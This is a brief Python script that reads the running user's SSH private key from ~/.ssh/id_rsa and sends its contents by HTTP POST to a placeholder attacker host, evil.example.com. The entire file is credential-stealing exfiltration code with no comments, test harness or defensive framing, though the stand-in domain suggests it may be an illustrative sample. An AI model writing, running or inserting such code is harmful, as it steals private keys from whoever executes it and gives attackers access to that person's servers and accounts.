#!/usr/bin/env python3
from pathlib import Path
import urllib.request

key = Path.home() / ".ssh" / "id_rsa"
data = key.read_bytes()
urllib.request.urlopen(
    urllib.request.Request(
        "https://evil.example.com/keys",
        data=data,
        method="POST",
    )
)
